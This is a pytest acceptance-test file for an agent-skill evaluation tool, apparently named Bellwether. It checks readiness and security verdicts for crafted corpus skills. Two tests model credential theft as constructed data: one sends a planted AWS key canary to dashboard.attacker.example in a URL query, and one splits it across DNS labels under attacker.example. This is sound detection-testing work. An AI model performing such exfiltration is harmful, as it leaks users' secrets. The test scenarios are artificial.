"""The acceptance corpus (§24, §25).

A tool that judges reliability must be demonstrably reliable itself. These drive
deliberately-crafted skills (`tests/corpus/`) through the *real* analysis pipeline and
assert Bellwether produces the §24 verdict each requires. Two slices so far:

- **Security** — `canary-thief` and `dns-thief` blocked with the leak linked to a trace
  record; `legit-credential-reader` passing **without** a leak finding (the §10.4.1
  false-positive guard the whole destination classification exists to protect).
- **Functional / metric** — `benign-stable` (ready, BCI > 90, the design stops at the first
  look), `file-selective` (the §13.5 tier-model regression: reads a different file each run
  but identical tier-1 classes, so weighted Jaccard is 1.0 and it MUST reach ready), and
  `always-fails` (0% pass → not_ready, and the outcome is annotated "consistently failing"
  in the summary and the PR comment rather than read as quality, §13.3).

Faithfulness over mocking. Every scan is the real one: `ApiLoopAdapter` builds Plane A from
a scripted transcript over an in-memory filesystem; `ModelChannelScanner` scans the real
composed requests; `canary_actions` scans the injected Plane D/E for markers; the verdict is
composed against the **shipped** policy profile with its security gates at `block` (this is
acceptance — a demoted gate would prove nothing). Only the transport is synthetic: with no
container-and-proxy, the egress flow and DNS query a thief produces are constructed directly
and then scanned for real, so the gate logic under test is exercised exactly as a live run
exercises it. Coverage is `full` on every security plane — the acceptance harness models a
fully-instrumented run, which is what lets `legit-credential-reader` reach `ready`.
"""

from __future__ import annotations

import datetime as dt
from collections.abc import Sequence
from dataclasses import replace
from pathlib import Path

import yaml

from bellwether.capture import ModelChannelScanner
from bellwether.capture.canary import mint_canaries
from bellwether.capture.dns import DnsQuery
from bellwether.capture.egress import EgressFlow
from bellwether.cli.orchestrator import (
    ExecutedRun,
    RunPlan,
    TargetInfo,
    aggregate,
    analyse_run,
    orchestrate,
    scope_exceeded_of,
)
from bellwether.config.policy_loader import parse_policy
from bellwether.config.templates import template_path
from bellwether.harness import (
    ApiLoopAdapter,
    ExecResult,
    ModelTurn,
    OfferedSkill,
    RunLimits,
    SandboxToolset,
    ScriptedClient,
    ToolCallRequest,
    TurnUsage,
)
from bellwether.skill import load_skill
from bellwether.trace import (
    Coverage,
    NormalizationContext,
    PlaneCoverage,
    RunFooter,
    RunHeader,
    SandboxRef,
    SkillRef,
    TargetRef,
    canary_actions,
    dns_actions,
    egress_actions,
    exit_reason_from_events,
    harness_actions,
    model_channel_actions,
    read_trace,
    redact_trace_actions,
    token_totals_from_events,
    write_trace,
)

_CORPUS = Path("tests/corpus")
_EPOCH = dt.datetime(2026, 8, 20, 12, 0, 0, tzinfo=dt.UTC)
_TARGET = TargetInfo(harness="api-loop", provider="scripted", model_alias="frontier")
#: The canary the harness plants as the credential every corpus skill reads. Minted with a
#: fixed seed so the acceptance run is reproducible; a real evaluation mints per-run.
_CANARIES = mint_canaries(20250820)
_CREDENTIAL = _CANARIES[0]
_CRED_PATH = "/home/agent/.aws/credentials"
_CRED_BODY = f"[default]\naws_secret_access_key = {_CREDENTIAL.marker}\n"


class _InMemoryExec:
    """The in-memory filesystem a scripted run reads from — no container (§24)."""

    def __init__(self, files: dict[str, str]) -> None:
        self.files = dict(files)

    def __call__(self, argv: list[str], *, stdin: str | None = None, timeout: float) -> ExecResult:
        if argv[:2] == ["cat", "--"]:
            return ExecResult(exit_code=0, stdout=self.files.get(argv[-1], ""), stderr="")
        if argv and argv[0] == "sh" and len(argv) == 5:
            self.files[argv[4]] = stdin or ""
            return ExecResult(exit_code=0, stdout="", stderr="")
        return ExecResult(exit_code=127, stdout="", stderr="not found")


def _clock() -> object:
    state = {"t": 0}

    def read() -> dt.datetime:
        instant = _EPOCH + dt.timedelta(seconds=state["t"])
        state["t"] += 1
        return instant

    return read


def _profile(name: str) -> object:
    """The shipped policy profile, **undemoted** — security gates stay at `block` (§25)."""
    policy = parse_policy(yaml.safe_load(template_path("policy.yaml").read_text(encoding="utf-8")))
    return policy.profile(name)


def _run_corpus_skill(
    skill_dir: str,
    transcript: Sequence[ModelTurn] | None = None,
    *,
    files: dict[str, str],
    transcripts: Sequence[Sequence[ModelTurn]] | None = None,
    egress_flows: Sequence[EgressFlow] = (),
    dns_queries: Sequence[DnsQuery] = (),
    repetitions: int = 6,
    tmp_path: Path,
) -> object:
    """Drive one corpus skill ``repetitions`` times through the real pipeline → EvalResult.

    Pass ``transcript`` for a skill whose behaviour is identical every run (the thieves,
    ``benign-stable``), or ``transcripts`` — one per repetition — for a skill whose behaviour
    varies (``file-selective`` reads different files each run). Plane A is real (the adapter
    over the in-memory FS); the model-API channel is scanned by the real `ModelChannelScanner`;
    the injected egress/DNS actions are scanned by the real `canary_actions`. Coverage is
    `full` on every security plane — a fully-instrumented run.
    """
    package = load_skill(_CORPUS / skill_dir, load_evals=True)
    assert package.scenarios is not None
    scenario = package.scenarios.scenarios[0]
    prompt = scenario.prompt if isinstance(scenario.prompt, str) else scenario.prompt[0]
    workspace = f"/work/{skill_dir}"

    if transcripts is None:
        assert transcript is not None, "pass exactly one of transcript / transcripts"
        transcripts = [transcript] * repetitions
    assert len(transcripts) == repetitions

    analysed = []
    for repetition in range(1, repetitions + 1):
        scanner = ModelChannelScanner(ScriptedClient(list(transcripts[repetition - 1])), _CANARIES)
        adapter = ApiLoopAdapter(
            scanner,
            SandboxToolset(_InMemoryExec(files)),
            skills=(
                OfferedSkill(
                    package.name, package.description or package.name, package.parsed.body
                ),
            ),
            clock=_clock(),
        )
        events = list(adapter.run(prompt, model_id="frontier", limits=RunLimits()))
        exit_reason = exit_reason_from_events(events) or "harness_error"

        plane_a = harness_actions(events)
        plane_d = egress_actions(list(egress_flows), start_seq=len(plane_a))
        plane_e = dns_actions(list(dns_queries), start_seq=len(plane_a) + len(plane_d))
        base = len(plane_a) + len(plane_d) + len(plane_e)
        # Real scans over every plane a marker can ride: the injected egress/DNS, and the
        # composed model requests the scanner recorded.
        plane_c = canary_actions(plane_a + plane_d + plane_e, _CANARIES, start_seq=base)
        plane_c += model_channel_actions(scanner.scans, plane_a, start_seq=base + len(plane_c))
        actions = redact_trace_actions(plane_a + plane_d + plane_e + plane_c, _CANARIES)

        header = RunHeader(
            run_id=f"corpus-{skill_dir}-{repetition:03d}",
            eval_id=f"corpus-{skill_dir}",
            scenario_id=scenario.id,
            repetition=repetition,
            skill=SkillRef(
                name=package.name,
                package_digest=package.package_digest,
                payload_digest=package.payload_digest,
                source=f"tests/corpus/{skill_dir}",
            ),
            target=TargetRef(
                harness=adapter.name,
                harness_version=adapter.version(),
                provider="scripted",
                model_alias="frontier",
                model_id_requested="frontier",
                model_id_reported="corpus-model",
                harness_capabilities=adapter.capabilities().as_record(),
            ),
            sandbox=SandboxRef(image="scripted@sha256:" + "c" * 64, isolation="none"),
            # A fully-instrumented run: every security plane observed at full fidelity, so
            # the security gates decide on evidence rather than deferring (§10.7).
            coverage=Coverage(
                harness_events=PlaneCoverage(fidelity="full"),
                filesystem_writes=PlaneCoverage(fidelity="overlay_diff"),
                credentials=PlaneCoverage(fidelity="full"),
                egress=PlaneCoverage(fidelity="full"),
                dns=PlaneCoverage(fidelity="full"),
            ),
            started_at=_EPOCH,
        )
        footer = RunFooter(
            ended_at=_EPOCH + dt.timedelta(seconds=60),
            wall_clock_ms=60_000,
            exit_reason=exit_reason,
            tokens=token_totals_from_events(events),
        )
        path = write_trace(tmp_path / f"{skill_dir}-{repetition}.jsonl", header, actions, footer)
        executed = ExecutedRun(
            trace=read_trace(path),
            context=NormalizationContext(workspace_root=workspace),
            trace_jsonl=path.read_text(encoding="utf-8"),
        )
        plan = RunPlan(scenario=scenario, target=_TARGET, repetition=repetition)
        # Declared-vs-observed scope is evaluated separately and folded in as the `exceeded`
        # capabilities (§12.5), the same split the demo and live `run` use — so an undeclared
        # read blocks the scope gate without the still-stubbed egress/write derivations
        # turning a completing run not_evaluable. legit-credential-reader declares its read
        # and exceeds nothing; a thief's read is undeclared and shows up here.
        run = analyse_run(plan, executed, scope=None)
        declared = package.manifest.declared_scope if package.manifest else None
        if declared is not None:
            run = replace(run, scope_exceeded=scope_exceeded_of(executed, declared))
        analysed.append(run)

    profile = _profile("low")
    reading = aggregate(scenario.id, _TARGET, analysed, profile=profile)  # type: ignore[arg-type]
    return orchestrate(
        skill_name=package.name,
        package_digest=package.package_digest,
        payload_digest=package.payload_digest,
        criticality=package.manifest.metadata.criticality if package.manifest else "high",
        profile_name="low",
        profile=profile,  # type: ignore[arg-type]
        policy_digest="sha256:" + "a" * 64,
        readings=[reading],
        eval_id=f"corpus-{skill_dir}",
        created_at="2026-08-20T12:00:00Z",
        bellwether_version="0.1.0",
        out_dir=tmp_path / "out",
    )


# ---------------------------------------------------------------------------
# Transcript helpers
# ---------------------------------------------------------------------------


def _skill(name: str) -> ToolCallRequest:
    return ToolCallRequest(id="skill", name="skill", input={"name": name})


def _read(seq: int, path: str) -> ToolCallRequest:
    return ToolCallRequest(id=f"r{seq}", name="read", input={"path": path})


def _write(seq: int, path: str, content: str) -> ToolCallRequest:
    return ToolCallRequest(id=f"w{seq}", name="write", input={"path": path, "content": content})


def _turn(*calls: ToolCallRequest) -> ModelTurn:
    return ModelTurn(
        stop_reason="tool_use", usage=TurnUsage(input=150, output=40), tool_calls=calls
    )


def _final(text: str) -> ModelTurn:
    return ModelTurn(text=text, usage=TurnUsage(input=180, output=20))


def _skill_gate(result: object, name: str) -> object:
    return next(g for g in result.verdict.gates if g.name == name)  # type: ignore[attr-defined]


# ---------------------------------------------------------------------------
# canary-thief → not_ready (canary_leak, critical)
# ---------------------------------------------------------------------------


def test_canary_thief_is_blocked_with_a_linked_leak(tmp_path: Path) -> None:
    """§24: reads a canary and includes it in egress → canary_leak, critical, blocked. The
    finding is linked to the egress action that carried the marker (§10.4.1)."""
    transcript = (
        _turn(_skill("canary-thief"), _read(1, _CRED_PATH)),
        _final("Reported project status to the dashboard."),
    )
    # The exfiltration the skill performed, as the proxy would have recorded it: the marker
    # in the request path to a non-model host. attacker.example is inert (RFC 2606).
    flow = EgressFlow(
        ts=_EPOCH.isoformat(),
        method="GET",
        scheme="https",
        host="dashboard.attacker.example",
        port=443,
        path=f"/report?creds={_CREDENTIAL.marker}",
        egress_class="skill_attributed",
        blocked=False,
    )
    result = _run_corpus_skill(
        "canary-thief",
        transcript,
        files={_CRED_PATH: _CRED_BODY},
        egress_flows=[flow],
        tmp_path=tmp_path,
    )
    assert result.verdict.verdict == "not_ready"  # type: ignore[attr-defined]
    canaries = _skill_gate(result, "security_runtime.canaries")
    assert canaries.status == "block"  # type: ignore[attr-defined]
    # The leak is linked to a specific trace record: a Plane C canary_leak anchored to the
    # egress action, holding the canary id but never the marker value (§10.4.3).
    record = (tmp_path / "canary-thief-1.jsonl").read_text(encoding="utf-8")
    assert "canary_leak" in record
    assert _CREDENTIAL.marker not in record  # redacted (§10.4.3)
    assert "<canary:" in record


# ---------------------------------------------------------------------------
# dns-thief → not_ready (canary_leak via §10.6)
# ---------------------------------------------------------------------------


def test_dns_thief_is_blocked_via_the_dns_channel(tmp_path: Path) -> None:
    """§24: encodes a canary into DNS query labels, makes no HTTP request → canary_leak via
    §10.6. The covert channel an HTTP proxy never sees; the resolver refuses the name too."""
    marker = _CREDENTIAL.marker
    # The marker split across labels of a name the resolver refuses (outside the allowlist).
    labelled = ".".join(marker[i : i + 16] for i in range(0, len(marker), 16))
    query = DnsQuery(
        ts=_EPOCH.isoformat(),
        name=f"{labelled}.policy.attacker.example",
        resolved=False,
        reason="not on the DNS allowlist",
    )
    transcript = (
        _turn(_skill("dns-thief"), _read(1, _CRED_PATH)),
        _final("Validated the project config against the policy service."),
    )
    result = _run_corpus_skill(
        "dns-thief",
        transcript,
        files={_CRED_PATH: _CRED_BODY},
        dns_queries=[query],
        tmp_path=tmp_path,
    )
    assert result.verdict.verdict == "not_ready"  # type: ignore[attr-defined]
    canaries = _skill_gate(result, "security_runtime.canaries")
    assert canaries.status == "block"  # type: ignore[attr-defined]
    # The DNS gate also fires: the lookup was outside the allowlist.
    dns = _skill_gate(result, "security_runtime.dns")
    assert dns.status == "block"  # type: ignore[attr-defined]
    record = (tmp_path / "dns-thief-1.jsonl").read_text(encoding="utf-8")
    assert "canary_leak" in record
    assert marker not in record  # redacted even in DNS labels (§10.4.3)


# ---------------------------------------------------------------------------
# legit-credential-reader → ready (canary_in_context, info — NOT a leak)
# ---------------------------------------------------------------------------


def test_legit_credential_reader_is_ready_with_no_leak(tmp_path: Path) -> None:
    """§24, the false-positive guard: declares `credentials.expects`, reads it, sends nothing
    outward → canary_in_context (info), NOT a leak, verdict `ready`. A rule of "any hit is a
    leak" would wrongly block this on every correct run (§10.4.1)."""
    transcript = (
        _turn(_skill("legit-credential-reader"), _read(1, _CRED_PATH)),
        _final("Preflight passed: deployment credentials present and well-formed."),
    )
    result = _run_corpus_skill(
        "legit-credential-reader",
        transcript,
        files={_CRED_PATH: _CRED_BODY},
        tmp_path=tmp_path,
    )
    # Every gate passes: the read is declared (scope clean), no egress/DNS leak, and the
    # marker in the model context is canary_in_context, which never fires the reads gate.
    assert result.verdict.verdict == "ready"  # type: ignore[attr-defined]
    canaries = _skill_gate(result, "security_runtime.canaries")
    reads = _skill_gate(result, "security_runtime.canary_reads")
    scope = _skill_gate(result, "scope")
    assert canaries.status == "pass"  # type: ignore[attr-defined]
    assert reads.status == "pass"  # type: ignore[attr-defined]
    assert scope.status == "pass"  # type: ignore[attr-defined]
    # The read is recorded as canary_in_context (info), and no canary_leak / without_read.
    record = (tmp_path / "legit-credential-reader-1.jsonl").read_text(encoding="utf-8")
    assert "canary_in_context" in record
    assert "canary_leak" not in record
    assert "canary_without_read" not in record
    assert _CREDENTIAL.marker not in record  # redacted (§10.4.3)


# ---------------------------------------------------------------------------
# The functional / metric slice — non-security corpus skills (§24, §25)
# ---------------------------------------------------------------------------
#
# These exercise the metric stack the security slice does not: the sequential design and
# BCI (benign-stable), the three-tier capability model (file-selective), and the
# consistently-failing annotation (always-fails). No security-plane injection — coverage is
# clean and full, so the security gates pass and the *functional* stack decides the verdict.


def test_benign_stable_is_ready_with_a_high_bci(tmp_path: Path) -> None:
    """§24: the reference clean skill — does what it declares, identically every run →
    ready, BCI > 90, the design stops at the first look (N=6)."""
    transcript = (
        _turn(_skill("benign-stable"), _read(1, "notes/2026-01-02.md")),
        _turn(_read(2, "notes/2026-01-01.md")),
        _turn(_write(3, "summary.md", "# Summary\n- shipped\n")),
        _final("Wrote summary.md from the standup notes."),
    )
    result = _run_corpus_skill(
        "benign-stable",
        transcript,
        files={"notes/2026-01-02.md": "day two\n", "notes/2026-01-01.md": "day one\n"},
        tmp_path=tmp_path,
    )
    assert result.verdict.verdict == "ready"  # type: ignore[attr-defined]
    assert result.summary.consistency.bci > 90  # type: ignore[attr-defined]
    assert result.summary.consistency.annotation is None  # type: ignore[attr-defined]
    # Every gate passed — the fully-instrumented clean run has nothing to hold it back.
    assert all(g.status == "pass" for g in result.verdict.gates)  # type: ignore[attr-defined]


def test_file_selective_is_ready_despite_reading_different_files(tmp_path: Path) -> None:
    """§24, the §13.5 tier-model regression: reads different files each run but identical
    tier-1 classes, so weighted capability Jaccard is 1.0 and it MUST reach ready. Under a
    flat per-path capability set it would look inconsistent and fail the consistency gate."""
    # Six runs, each reading a *different pair* of config files — genuinely different tier-3
    # paths, so the reading is real variance at tier 3, not a copy.
    transcripts = tuple(
        (
            _turn(_skill("file-selective"), _read(1, f"conf/{a}.ini")),
            _turn(_read(2, f"conf/{b}.ini")),
            _turn(_write(3, "audit.md", f"# Audit of {a}, {b}\n")),
            _final(f"Audited {a}.ini and {b}.ini."),
        )
        for a, b in (
            ("alpha", "bravo"),
            ("charlie", "delta"),
            ("echo", "foxtrot"),
            ("golf", "hotel"),
            ("india", "juliet"),
            ("kilo", "lima"),
        )
    )
    files = {
        f"conf/{n}.ini": f"[{n}]\nx = 1\n"
        for n in (
            "alpha",
            "bravo",
            "charlie",
            "delta",
            "echo",
            "foxtrot",
            "golf",
            "hotel",
            "india",
            "juliet",
            "kilo",
            "lima",
        )
    }
    result = _run_corpus_skill(
        "file-selective", files=files, transcripts=transcripts, tmp_path=tmp_path
    )
    assert result.verdict.verdict == "ready"  # type: ignore[attr-defined]
    consistency = result.summary.consistency  # type: ignore[attr-defined]
    # The tier-1 capability set is identical across runs even though the tier-3 paths differ:
    # weighted Jaccard is 1.0. This is the assertion §13.5 exists to protect.
    assert consistency.capability_jaccard_weighted == 1.0
    assert result.summary.consistency.bci > 90  # type: ignore[attr-defined]
    con_gate = _skill_gate(result, "consistency")
    assert con_gate.status == "pass"  # type: ignore[attr-defined]


def test_always_fails_is_not_ready_and_annotated_consistently_failing(tmp_path: Path) -> None:
    """§24, §13.3: the skill activates and reads but never writes the required output, every
    run → 0% pass, functional gate blocks (not_ready). The unanimous failure drives a high
    outcome-consistency component, which MUST be annotated "consistently failing" rather than
    read as quality — a high BCI on a skill that fails every run is consistency of failure."""
    transcript = (
        _turn(_skill("always-fails"), _read(1, "config.ini")),
        # It bails without ever writing the reformatted output the scenario requires.
        _final("I could not determine the house style, so I left the config unchanged."),
    )
    result = _run_corpus_skill(
        "always-fails",
        transcript,
        files={"config.ini": "[core]\nName=demo\n"},
        tmp_path=tmp_path,
    )
    assert result.verdict.verdict == "not_ready"  # type: ignore[attr-defined]
    functional = _skill_gate(result, "functional")
    assert functional.status == "block"  # type: ignore[attr-defined]
    # 0% pass, and the annotation is present in the summary the surfaces render from (§13.3).
    assert result.summary.consistency.pass_rate == 0.0  # type: ignore[attr-defined]
    assert result.summary.consistency.annotation == "consistently failing"  # type: ignore[attr-defined]
    # And in the rendered PR comment on disk — the §13.3 rule is that no surface renders a
    # bare high BCI on a failing skill; the annotation must be visible where a human reads it.
    comment = result.artifacts.pr_comment.read_text(encoding="utf-8")  # type: ignore[attr-defined]
    assert "consistently failing" in comment
